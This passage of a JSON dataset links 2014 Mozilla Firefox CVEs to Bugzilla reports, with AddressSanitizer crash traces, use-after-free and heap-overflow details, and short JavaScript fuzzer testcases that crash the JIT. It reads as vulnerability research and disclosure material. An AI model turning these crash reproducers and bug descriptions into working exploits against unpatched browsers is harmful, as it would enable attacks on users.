/home/attekett/firefox/js/src/vm/Interpreter.cpp:511 #17 0x7f37df608875 in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/attekett/firefox/js/src/jsapi.cpp:5210 #18 0x7f37da6ce4cd in mozilla::dom::Function::Call(JSContext*, JS::Handle<JS::Value>, nsTArray<JS::Value> const&, mozilla::ErrorResult&) /home/attekett/firefox/objdir-ff-asan/dom/bindings/./FunctionBinding.cpp:34 #19 0x7f37db771ebe in JS::Value mozilla::dom::Function::Call<nsCOMPtr<nsISupports> >(nsCOMPtr<nsISupports> const&, nsTArray<JS::Value> const&, mozilla::ErrorResult&, mozilla::dom::CallbackObject::ExceptionHandling) /home/attekett/firefox/objdir-ff-asan/dom/base/../../dist/include/mozilla/dom/FunctionBinding.h:58 #20 0x7f37db747dd0 in nsGlobalWindow::RunTimeoutHandler(nsTimeout*, nsIScriptContext*) /home/attekett/firefox/dom/base/nsGlobalWindow.cpp:12106 #21 0x7f37db72c23a in nsGlobalWindow::RunTimeout(nsTimeout*) /home/attekett/firefox/dom/base/nsGlobalWindow.cpp:12330 #22 0x7f37db74755f in nsGlobalWindow::TimerCallback(nsITimer*, void*) /home/attekett/firefox/dom/base/nsGlobalWindow.cpp:12576 #23 0x7f37d8ab5390 in nsTimerImpl::Fire() /home/attekett/firefox/xpcom/threads/nsTimerImpl.cpp:609 #24 0x7f37d8ab594e in nsTimerEvent::Run() /home/attekett/firefox/xpcom/threads/nsTimerImpl.cpp:702 #25 0x7f37d8aade08 in nsThread::ProcessNextEvent(bool, bool*) /home/attekett/firefox/xpcom/threads/nsThread.cpp:766 #26 0x7f37d8992e09 in NS_ProcessNextEvent(nsIThread*, bool) /home/attekett/firefox/xpcom/glue/nsThreadUtils.cpp:263 #27 0x7f37d92b7384 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/attekett/firefox/ipc/glue/MessagePump.cpp:136 #28 0x7f37d92461fe in MessageLoop::RunInternal() /home/attekett/firefox/ipc/chromium/src/base/message_loop.cc:229 #29 0x7f37db35be2f in nsBaseAppShell::Run() /home/attekett/firefox/widget/xpwidgets/nsBaseAppShell.cpp:164 Thread T27 (MediaStreamGrph) created by T0 here: #0 0x423626 in __interceptor_pthread_create _asan_rtl_ #1 0x7f37e414f81d in _PR_CreateThread /home/attekett/firefox/nsprpub/pr/src/pthreads/ptthread.c:453 #2 0x7f37e414f39a in PR_CreateThread /home/attekett/firefox/nsprpub/pr/src/pthreads/ptthread.c:544 #3 0x7f37d8aac31a in nsThread::Init() /home/attekett/firefox/xpcom/threads/nsThread.cpp:423 #4 0x7f37d8ab06a8 in nsThreadManager::NewThread(unsigned int, unsigned int, nsIThread**) /home/attekett/firefox/xpcom/threads/nsThreadManager.cpp:248 #5 0x7f37d8992605 in NS_NewThread(nsIThread**, nsIRunnable*, unsigned int) /home/attekett/firefox/xpcom/glue/nsThreadUtils.cpp:67 #6 0x7f37dc41ba5c in tag_nsresult NS_NewNamedThread<16ul>(char const (&) [16ul], nsIThread**, nsIRunnable*, unsigned int) /home/attekett/firefox/objdir-ff-asan/content/media/../../dist/include/nsThreadUtils.h:75 #7 0x7f37dc435c10 in mozilla::(anonymous namespace)::MediaStreamGraphStableStateRunnable::Run() /home/attekett/firefox/content/media/MediaStreamGraph.cpp:1580 #8 0x7f37db35ce0d in nsCOMPtr_base::assign_assuming_AddRef(nsISupports*) /home/attekett/firefox/objdir-ff-asan/widget/xpwidgets/../../dist/include/nsCOMPtr.h:486 #9 0x7f37db35d3cd in nsBaseAppShell::AfterProcessNextEvent(nsIThreadInternal*, unsigned int, bool) /home/attekett/firefox/widget/xpwidgets/nsBaseAppShell.h:93 #10 0x7f37d8aae2ab in nsThread::ProcessNextEvent(bool, bool*) /home/attekett/firefox/xpcom/threads/nsThread.cpp:780 #11 0x7f37d8992e09 in NS_ProcessNextEvent(nsIThread*, bool) /home/attekett/firefox/xpcom/glue/nsThreadUtils.cpp:263 #12 0x7f37d92b73a5 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/attekett/firefox/ipc/glue/MessagePump.cpp:95 #13 0x7f37d92461fe in MessageLoop::RunInternal() /home/attekett/firefox/ipc/chromium/src/base/message_loop.cc:229 #14 0x7f37db35be2f in nsBaseAppShell::Run() /home/attekett/firefox/widget/xpwidgets/nsBaseAppShell.cpp:164 #15 0x7f37ddc0e8b6 in nsAppStartup::Run() /home/attekett/firefox/toolkit/components/startup/nsAppStartup.cpp:278 #16 0x7f37dda7eba8 in XREMain::XRE_mainRun() /home/attekett/firefox/toolkit/xre/nsAppRunner.cpp:4012 #17 0x7f37dda7f849 in XREMain::XRE_main(int, char**, nsXREAppData const*) /home/attekett/firefox/toolkit/xre/nsAppRunner.cpp:4083 #18 0x7f37dda8018b in XRE_main /home/attekett/firefox/toolkit/xre/nsAppRunner.cpp:4297 #19 0x479fa6 in do_main(int, char**, nsIFile*) /home/attekett/firefox/browser/app/nsBrowserApp.cpp:282 #20 0x7f37e66a276c in ?? ??:0 SUMMARY: AddressSanitizer: heap-buffer-overflow ??:0 ?? Shadow bytes around the buggy address: 0x0fe775b7b580: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0fe775b7b590: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0fe775b7b5a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0fe775b7b5b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0fe775b7b5c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 =>0x0fe775b7b5d0: 00 00 00 00[fa]fa fa fa fa fa fa fa fa fa fa fa 0x0fe775b7b5e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0fe775b7b5f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0fe775b7b600: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0fe775b7b610: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0fe775b7b620: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Contiguous container OOB:fc ASan internal: fe ==6994==ABORTING"
      }
    ],
    "CVE-2014-1552": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=985135",
        "title": "Iframe sandboxing doesn't work if the load is redirected",
        "description": "<iframe sandbox src=\"something-that-redirects\"> doesn't sandbox because we do sandboxing via setting a nullprincipal owner and redirects don't propagate it. I'll attach a mochitest that shows the bug.... Properly fixing bug 965413 will automagically fix this, but we may want some sort of branch backports."
      }
    ],
    "CVE-2014-1553": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1041148",
        "title": "GC hazard with worker XMLHttpRequest",
        "description": "With the patch for bug 1039551, I'm getting Windows-only, debug-only Mochitest-4 GC crashes. See the stack trace below. We're crashing here: NS_IMPL_CYCLE_COLLECTION_TRACE_BEGIN_INHERITED(XMLHttpRequest, nsXHREventTarget) NS_IMPL_CYCLE_COLLECTION_TRACE_JSVAL_MEMBER_CALLBACK(mStateData.mResponse) NS_IMPL_CYCLE_COLLECTION_TRACE_END Because mStateData.mResponse points to 0x4b4b4b4b memory (freed GC thing). When we assign this value in XMLHttpRequest::GetResponse: mStateData.mResponse = STRING_TO_JSVAL(str); It's still valid AFAICS. Somehow we're not tracing it and the GC frees it. Not sure how to debug this... CC experts, does anything about this code look wrong? 08:26:29 INFO - 0 mozjs.dll!js::gc::ArenaHeader::getAllocKind() [Heap.h:a4db87a48b24 : 509 + 0x42] 08:26:29 INFO - 1 mozjs.dll!js::gc::GetGCThingTraceKind(void const *) [jsgcinlines.h:a4db87a48b24 : 122 + 0xd] 08:26:29 INFO - 2 mozjs.dll!js::GCThingTraceKind(void *) [jsfriendapi.cpp:a4db87a48b24 : 649 + 0x5] 08:26:29 INFO - 3 xul.dll!xpc_GCThingIsGrayCCThing(void *) [nsXPConnect.cpp:a4db87a48b24 : 261 + 0x8] 08:26:29 INFO - 4 xul.dll!SnowWhiteKiller::Trace(JS::Heap<JS::Value> *,char const *,void *) [nsCycleCollector.cpp:a4db87a48b24 : 2649 + 0x9] 08:26:29 INFO - 5 xul.dll!mozilla::dom::workers::XMLHttpRequest::cycleCollection::Trace(void *,TraceCallbacks const &,void *) [XMLHttpRequest.cpp:a4db87a48b24 : 1615 + 0x12] 08:26:29 INFO - 6 xul.dll!SnowWhiteKiller::~SnowWhiteKiller() [nsCycleCollector.cpp:a4db87a48b24 : 2618 + 0x13]"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=995075",
        "title": "OOM large null-offset write in update_filter() triggered with AudioBufferSourceNode",
        "description": "+++ This bug was initially created as a clone of Bug #987679 +++ A memory allocation failure at http://hg.mozilla.org/mozilla-central/annotate/d41e6e32df81/media/libspeex_resampler/src/resample.c#l698 can cause content-controlled data to be written to a large content-controlled offset from null. There is eventually a null deref, which will crash the program, but there will be a period of time during which other threads will continue to run compromised. The allocation request can be large, so it would not be difficult to generate an OOM under similar situations to bug 987679."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1027359",
        "title": "Differential Testing: Incorrect codegen for mod (%) on ARM sim",
        "description": "try { (function() { Array.buildPar(8, function(x) { if (x % 511 == 5) { n } }) })() print(this) } catch (e) {} $ ./js-dbg-32-dm-ts-armSim-darwin-f78e532e8a10 --fuzzing-safe --ion-offthread-compile=off 1623.js [object global] $ ./js-dbg-32-dm-ts-armSim-darwin-f78e532e8a10 --fuzzing-safe --ion-offthread-compile=off --no-baseline 1623.js (Tested this on 32-bit Mac js dbg threadsafe deterministic ARM-simulator shell off m-c rev f78e532e8a10) My configure flags are: LD=ld CROSS_COMPILE=1 CC=\"clang -Qunused-arguments -msse2 -mfpmath=sse -arch i386\" RANLIB=ranlib CXX=\"clang++ -Qunused-arguments -msse2 -mfpmath=sse -arch i386\" AS=$CC AR=ar STRIP=\"strip -x -S\" HOST_CC=\"clang -Qunused-arguments -msse2 -mfpmath=sse\" HOST_CXX=\"clang++ -Qunused-arguments -msse2 -mfpmath=sse\" sh /Users/skywalker/trees/mozilla-central/js/src/configure --target=i386-apple-darwin9.2.0 --enable-macos-target=10.5 --enable-arm-simulator --enable-optimize --enable-debug --enable-profiling --enable-gczeal --enable-debug-symbols --disable-tests --enable-more-deterministic --with-ccache --enable-threadsafe <other NSPR options>"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1022945",
        "title": "Shutdown crash with many mozGetUserMedia calls",
        "description": "+++ This bug was initially created as a clone of Bug #1002340 +++ 1. Load the testcase in an ASan build of Firefox 2. Quit Firefox On Nightly we (once again) have crashes in the MediaStreamGraph Resampler code. I can repro on opt builds only; a noopt build never hits it. I'll attach a stack. Strongly suspect that the Graph is going away while we're still pushing audio into it."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1033121",
        "title": "Race in nsTimerEvent destructor",
        "description": "I found this problem when debugging timeouts in test_playback_rate.html. [1] It looks like it is possible for |event| [2] to be executed in the target thread before nsTimerImpl::PostTimerEvent returns. Then nsTimerEvent will be deleted on exit of nsTimerImpl::PostTimerEvent in the timer thread. In the destructor of nsTimerEvent, it will call nsTimerImpl::Release in the timer thread. At the same time, it is also possible for nsTimerImpl::InitWithCallback to be called in the target thread. Therefore we might hit bug 997844 comment 0 again. [1] bug 1020707 comment 42 [2] http://hg.mozilla.org/mozilla-central/file/3a28d3bb4f55/xpcom/threads/nsTimerImpl.cpp#l763"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1037666",
        "title": "Crash [@ js::BarrieredBase<js::types::TypeObject*>::operator->] or Crash [@ js::ScriptSourceObject::initFromOptions] with offThread script",
        "description": "The following testcase crashes on mozilla-central revision e1a037c085d1 (threadsafe build, run with --fuzzing-safe --thread-count=2 --ion-eager): var g = newGlobal(); gczeal(2); offThreadCompileScript('Error()'); g.runOffThreadScript();"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1035007",
        "title": "nsStandardURL::SetHost called net_ToLowerCase with a bogus pointer, #4",
        "description": "No description provided."
      }
    ],
    "CVE-2014-1554": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=995704",
        "title": "Crash [@ EnterIon] or [@ js::jit::IonCannon] or [@ js::RunScript]",
        "description": "function g(f, inputs) { for (j = 0; j < 49; ++j) { f(inputs[j], inputs[0]) } } __proto__ = Iterator(true) m0 = (function(x, y) { return (Math.min((((Number.E | 0) * (y | 0) && x()) & Math.round((y | 0) ? Math.trunc((y) = 0) : Math.pow(Math.round))), (Math.tan(((Math.imul()) + ((Math.imul(Math.round(Math.round(x > 0)), Math.cbrt(Number.I))) < (y | 0))))))) }) m3 = (function(x, y) { return m1((((Number.E, m0()) * Math.tan) | Math.round(m1(Math.exp, m0(Math.tan(y))))), m2(x)) }) m1 = (function(x, y) { return Math.round(Math.round(Math.min((Math.imul() > (m0(y | 0, Math.round(m0())))), m0()))) }) m4 = (function(x, y) { return Math.min((y > 0, (m2(Math.pow(Math.sin)))), (m1(m3(), Math.round(m3(m3(x)))))) }); m2 = (function(x, y) { return (Math.round(m1(false, Math.round())) ^ (m0((m1(m0())), m0(Math.log < y)) ^ Math.min(Math.exp(Math.round(undefined > 0))))) }) try { (function() { m5 = (function(x, y) { m4(Math.round) }) g(m5, [, 0]) })() } catch (e) {} crashes js debug and opt shell on m-c changeset ebdf2740dc3e with --ion-eager --ion-parallel-compile=off --ion-range-analysis=off --ion-regalloc=backtracking at EnterIon with js::jit::IonCannon and js::RunScript on the stack. My configure flags are: MAKE=mozmake AR=ar sh c:\\\\\\\\Users\\\\\\\\mozillaadmin\\\\\\\\trees\\\\\\\\mozilla-central\\\\\\\\js\\\\\\\\src\\\\\\\\configure --enable-optimize --disable-debug --enable-profiling --enable-gczeal --enable-debug-symbols --disable-tests --enable-more-deterministic --enable-threadsafe <other NSPR options> Run this testcase multiple times (up to 50/100 times) to get it to reproduce. An upcoming unreduced testcase is a little more reliable (crashes up to once every 5 times). Setting s-s and sec-critical because a barely reproducible JIT crash on Windows sounds really bad, pending further analysis. Will try bisecting this."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=990247",
        "title": "Conditional jump or move depends on uninitialised value(s) and Use of uninitialised value of size 4 [@ dosprintf]",
        "description": "enableSPSProfilingAssertions(false) function f() { for (var j = 0; j < 1; ++j) { [][0] } } f() $ valgrind --track-origins=yes --vex-iropt-register-updates=allregs-at-mem-access --leak-check=full --show-leak-kinds=definite --smc-check=all-non-file ./js-opt-32-dm-vg-ts-linux-ccd91b78561f --no-asmjs --ion-parallel-compile=off --ion-eager w3-reduced.js shows an uninitialised value may have been created by a stack allocation at js::jit::Invalidate, by Valgrind. Tested on m-c rev ccd91b78561f on Linux. My configure flags are: CC=\"gcc -m32\" CXX=\"g++ -m32\" AR=ar PKG_CONFIG_LIBDIR=/usr/lib/pkgconfig sh /home/gkwong/trees/mozilla-central/js/src/configure --target=i686-pc-linux --enable-optimize=-O1 --disable-debug --enable-profiling --enable-gczeal --enable-debug-symbols --disable-tests --enable-more-deterministic --enable-valgrind --with-ccache --enable-threadsafe <other NSPR options> s-s because SPS profiler bugs can be security-related, so locking prior to further analysis. Setting needinfo? from Kannan as he has worked on SPS bugs recently."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1016519",
        "title": "crash in js::LifoAlloc::freeAll() | js::jit::BaselineScript::~BaselineScript() with address 0x5a5a5a62",
        "description": "This bug was filed from the Socorro interface and is report bp-ce2043f3-810d-400c-b43b-6dd032140527. ============================================================= Steps to Reproduce for me I had 3 tabs open Facebook my google mail my hotmail aka outlook mail I was getting the stop script warning https://support.mozilla.org/en-US/kb/warning-unresponsive-script I clicked the debug button on the nightly then it went away then it came back then I clicked debug again and after it this time it crashed my firefox"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1004480",
        "title": "Assertion failure: data.s.payload.why == why, at js/Value.h:1095 or Crash [@ argumentsVarIndex]",
        "description": "The following testcase asserts on mozilla-central revision b227a707080f (run with --fuzzing-safe): setJitCompilerOption(\"ion.usecount.trigger\", 30); var PointType = TypedObject.uint16.array(3); var VecPointType = PointType.array(3); for (var i = 0; i < 5000; i += 10) { var vec = new VecPointType(); var i0 = i % 3; vec[i0][new Function(\"ABCDEFGHIJK\", \"1234\")]; }"
      }
    ],
    "CVE-2014-1556": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1028891",
        "title": "WebGL app crashes Firefox",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36 Steps to reproduce: * Browse to http://cesiumjs.org/ * Click \"Click to interact\" to run the WebGL app Actual results: * Wait 10-30 seconds and Firefox crashes with a hard close and no noticeable new messages in the console. This does not crash in Chrome or IE 11 and did not crash before Firefox 30.0 This is also reproducible in Firefox 32.0a2 (Aurora) and 33.0a1 (Nightly) on a variety of platforms (Windows, Linux, Mac) and GPUs. This application loads tiled images for different parts of the globe as it spins, and creates WebGL textures for them. The memory pressure or use of web workers for other processing may be the problem. This is also reproducible by repeatedly zooming in and out in the simpler Cesium Viewer application (http://cesiumjs.org/Cesium/Build/Apps/CesiumViewer/index.html). This is open-source (https://github.com/AnalyticalGraphicsInc/cesium). We are happy to help debug and implement any workarounds. Related discussion: https://groups.google.com/forum/#!topic/cesium-dev/6SLOxrZBqj4"
      }
    ],
    "CVE-2014-1557": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=913805",
        "title": "Crash in [@ skia::`anonymous namespace''::ConvolveHorizontally<int>(unsigned char const*, skia::ConvolutionFilter1D const&, unsigned char*) ]",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0 (Beta/Release) Build ID: 20130906030202 Steps to reproduce: 1. Disable hardware acceleration. 2. Restart Firefox. 3. Go to http://dl.dropboxusercontent.com/u/95157096/85f61cf7/tgdvp4vc.jpg 4. Open a new tab. Actual results: Browser crash. See http://s449.photobucket.com/user/movh/media/3pq52uw_zps09d07c82.mp4.html Crash Report: bp-da1fdfd7-0c61-4dfb-9aa8-ab2f32130907"
      }
    ],
    "CVE-2014-1561": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1000514",
        "title": "Toolkit toolbar dialog customization event spoofing",
        "description": "+++ This bug was initially created as a clone of Bug #910375 +++ It is possible to craft a drag and drop event in content which mimics the behavior of a chrome customization event. This attack is very unlikely as it requires the user to have the customizable page / panel open and then drag and drop from another window to the page. The impact is also very low since all an attacker can do is move icons around. The current chrome code only uses the event to pick an icon to move. Marking this as security sensitive because bug 910375 was also security sensitive. STR 1. Open the customize toolbar dialog 2. Open above file in another window or visit https://people.mozilla.com/~dchan/drag.html 3. Drag the Firefox icon to a toolbar Result The Subscribe icon moves Expected Icon doesn't move"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=910375",
        "title": "New PanelUI / toolbar customization event spoofing",
        "description": "It is possible to craft a drag and drop event in content which mimics the behavior of a chrome customization event. This attack is very unlikely as it requires the user to have the customizable page / panel open and then drag and drop from another window to the page. The impact is also very low since all an attacker can do is move icons around. The current chrome code only uses the event to pick an icon to move. Marking this as security sensitive though it likely doesn't have to be since the code hasn't shipped yet. STR 1. Open about:customizing 2. Open above file in another window or visit https://people.mozilla.com/~dchan/drag.html 3. Drag the Firefox icon to one of the about:customizing panels Result The Subscribe icon moves Expected Icon doesn't move"
      }
    ],
    "CVE-2014-1562": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1054359",
        "title": "LCallDOMNative incorrectly assumes |this| is always an object",
        "description": "I was looking at crash URLs for JIT crashes on crash-stats, and was able to reproduce a crash in JIT code on manpower.com The problem is that CodeGenerator::visitCallDOMNative does: Register obj = masm.extractObject(Address(StackPointer, 0), argObj); But |this| is not guaranteed to be an object. So if you do something like: var method = document.body.mozMatchesSelector; method.call(v, \"selector\"); And v is an integer, we'll treat it as an object pointer and this allows an attacker to do all kinds of scary things. The attached testcase crashes Nightly for me on OS X, 32-bit (you may have to turn off off-thread compilation first)."
      }
    ],
    "CVE-2014-1563": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1018524",
        "title": "Heap-use-after-free in mozilla::DOMSVGLength::GetTearOff",
        "description": "Need fuzzPriv extension. https://www.squarefree.com/extensions/domFuzzLite3.xpi ==6521==ERROR: AddressSanitizer: heap-use-after-free on address 0x60700026a968 at pc 0x7f779d09e97a bp 0x7fff11d30870 sp 0x7fff11d30868 READ of size 8 at 0x60700026a968 thread T0 #0 0x7f779d09e979 in mozilla::DOMSVGLength::GetTearOff(nsSVGLength2*, nsSVGElement*, bool) objdir-ff-asan/content/svg/content/src/../../../../dist/include/nsISupportsImpl.h:51 #1 0x7f779d1e232f in nsSVGLength2::ToDOMAnimVal(mozilla::DOMSVGLength**, nsSVGElement*) content/svg/content/src/nsSVGLength2.cpp:336 #2 0x7f779d108850 in mozilla::dom::SVGAnimatedLength::AnimVal() content/svg/content/src/SVGAnimatedLength.cpp:37 #3 0x7f779b446989 in mozilla::dom::SVGAnimatedLengthBinding::get_animVal(JSContext*, JS::Handle<JSObject*>, mozilla::dom::SVGAnimatedLength*, JSJitGetterCallArgs) objdir-ff-asan/dom/bindings/./SVGAnimatedLengthBinding.cpp:48 #4 0x7f779b95bdfc in mozilla::dom::GenericBindingGetter(JSContext*, unsigned int, JS::Value*) dom/bindings/BindingUtils.cpp:2280 #5 0x7f77a06bd843 in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) js/src/jscntxtinlines.h:239 #6 0x7f77a0659b1e in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value const*, JS::MutableHandle<JS::Value>) js/src/vm/Interpreter.cpp:531 #7 0x7f77a06bf5fd in js::InvokeGetterOrSetter(JSContext*, JSObject*, JS::Value, unsigned int, JS::Value*, JS::MutableHandle<JS::Value>) js/src/vm/Interpreter.cpp:603 #8 0x7f77a04799ff in js::baseops::GetProperty(JSContext*, JS::Handle<JSObject*>, JS::Handle<JSObject*>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>) js/src/vm/Shape-inl.h:46 #9 0x7f77a06b0e19 in Interpret(JSContext*, js::RunState&) js/src/jsobj.h:984 #10 0x7f77a069615c in js::RunScript(JSContext*, js::RunState&) js/src/vm/Interpreter.cpp:422 #11 0x7f77a06bdd91 in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) js/src/vm/Interpreter.cpp:494 #12 0x7f77a0659b1e in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value const*, JS::MutableHandle<JS::Value>) js/src/vm/Interpreter.cpp:531 #13 0x7f77a034bdb5 in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) js/src/jsapi.cpp:5214 #14 0x7f779ad89131 in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, mozilla::ErrorResult&) objdir-ff-asan/dom/bindings/./EventHandlerBinding.cpp:35 #15 0x7f779c2a96ef in JS::Value mozilla::dom::EventHandlerNonNull::Call<nsISupports*>(nsISupports* const&, mozilla::dom::Event&, mozilla::ErrorResult&, mozilla::dom::CallbackObject::ExceptionHandling) objdir-ff-asan/dom/events/../../dist/include/mozilla/dom/EventHandlerBinding.h:62 #16 0x7f779c2a7c0f in mozilla::JSEventHandler::HandleEvent(nsIDOMEvent*) dom/events/JSEventHandler.cpp:214 #17 0x7f779c2767d0 in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) dom/events/EventListenerManager.cpp:950 #18 0x7f779c277b40 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) dom/events/EventListenerManager.cpp:1011 #19 0x7f779c268a01 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) dom/events/EventDispatcher.cpp:287 #20 0x7f779c26cb26 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsCOMArray<mozilla::dom::EventTarget>*) dom/events/EventDispatcher.cpp:597 #21 0x7f779d7ad394 in nsDocumentViewer::LoadComplete(tag_nsresult) layout/base/nsDocumentViewer.cpp:1004 #22 0x7f779e42970b in nsDocShell::EndPageLoad(nsIWebProgress*, nsIChannel*, tag_nsresult) docshell/base/nsDocShell.cpp:6963 #23 0x7f779e426899 in nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, tag_nsresult) docshell/base/nsDocShell.cpp:6762 #24 0x7f779e426cff in non-virtual thunk to nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, tag_nsresult) docshell/base/nsDocShell.cpp:6769 #25 0x7f779a2d0abb in nsDocLoader::DoFireOnStateChange(nsIWebProgress*, nsIRequest*, int&, tag_nsresult) uriloader/base/nsDocLoader.cpp:1268 #26 0x7f779a2cfe02 in nsDocLoader::doStopDocumentLoad(nsIRequest*, tag_nsresult) uriloader/base/nsDocLoader.cpp:850 #27 0x7f779a2cd9a3 in nsDocLoader::DocLoaderIsEmpty(bool) uriloader/base/nsDocLoader.cpp:740 #28 0x7f779a2cf202 in nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, tag_nsresult) uriloader/base/nsDocLoader.cpp:624 #29 0x7f779a2cf8ac in non-virtual thunk to nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, tag_nsresult) objdir-ff-asan/uriloader/base/Unified_cpp_uriloader_base0.cpp:628 #30 0x7f77991dda38 in nsLoadGroup::RemoveRequest(nsIRequest*, nsISupports*, tag_nsresult) netwerk/base/src/nsLoadGroup.cpp:689 #31 0x7f779c85397c in nsDocument::DoUnblockOnload() content/base/src/nsDocument.cpp:8706 #32 0x7f779c85362a in nsDocument::UnblockOnload(bool) content/base/src/nsDocument.cpp:8634 #33 0x7f779c8288c8 in nsDocument::DispatchContentLoadedEvents() content/base/src/nsDocument.cpp:4917 #34 0x7f779c878da0 in nsRunnableMethodImpl<void (nsDocument::*)(), void, true>::Run() objdir-ff-asan/content/base/src/../../../dist/include/nsThreadUtils.h:387 #35 0x7f77990765b5 in nsThread::ProcessNextEvent(bool, bool*) xpcom/threads/nsThread.cpp:766 #36 0x7f7798f3622a in NS_ProcessNextEvent(nsIThread*, bool) xpcom/glue/nsThreadUtils.cpp:263 #37 0x7f77998704a9 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) ipc/glue/MessagePump.cpp:95 #38 0x7f7799818920 in MessageLoop::Run() ipc/chromium/src/base/message_loop.cc:229 #39 0x7f779bb979d7 in nsBaseAppShell::Run() widget/xpwidgets/nsBaseAppShell.cpp:164 #40 0x7f779ea75628 in nsAppStartup::Run() toolkit/components/startup/nsAppStartup.cpp:278 #41 0x7f779e8ef0d3 in XREMain::XRE_mainRun() toolkit/xre/nsAppRunner.cpp:4012 #42 0x7f779e8effaf in XREMain::XRE_main(int, char**, nsXREAppData const*) toolkit/xre/nsAppRunner.cpp:4081 #43 0x7f779e8f0dfd in XRE_main toolkit/xre/nsAppRunner.cpp:4293 #44 0x48c757 in main browser/app/nsBrowserApp.cpp:282 #45 0x7f77a79d1de4 in __libc_start_main /build/buildd/eglibc-2.17/csu/libc-start.c:260 0x60700026a968 is located 40 bytes inside of 80-byte region [0x60700026a940,0x60700026a990) freed by thread T0 here: #0 0x473bf1 in __interceptor_free _asan_rtl_ #1 0x7f7798f87d1a in SnowWhiteKiller::~SnowWhiteKiller() xpcom/base/nsCycleCollector.cpp:2611 #2 0x7f7798f87929 in nsCycleCollector::FreeSnowWhite(bool) xpcom/base/nsCycleCollector.cpp:2778 #3 0x7f7798f8d67f in nsCycleCollector::BeginCollection(ccType, nsICycleCollectorListener*) xpcom/base/nsCycleCollector.cpp:3705 #4 0x7f7798f8cdb6 in nsCycleCollector::Collect(ccType, js::SliceBudget&, nsICycleCollectorListener*) xpcom/base/nsCycleCollector.cpp:3546 #5 0x7f7798f90d0c in nsCycleCollector_collect(nsICycleCollectorListener*) xpcom/base/nsCycleCollector.cpp:4127 #6 0x7f779c049263 in nsJSContext::CycleCollectNow(nsICycleCollectorListener*, int) dom/base/nsJSEnvironment.cpp:1943 #7 0x7f779c04895f in nsJSEnvironmentObserver::Observe(nsISupports*, char const*, char16_t const*) dom/base/nsJSEnvironment.cpp:283 #8 0x7f7798fd7329 in nsObserverService::NotifyObservers(nsISupports*, char const*, char16_t const*) xpcom/ds/nsObserverList.cpp:96 #9 0x7f779908b331 in NS_InvokeByIndex xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 #10 0x7f779bd882c7 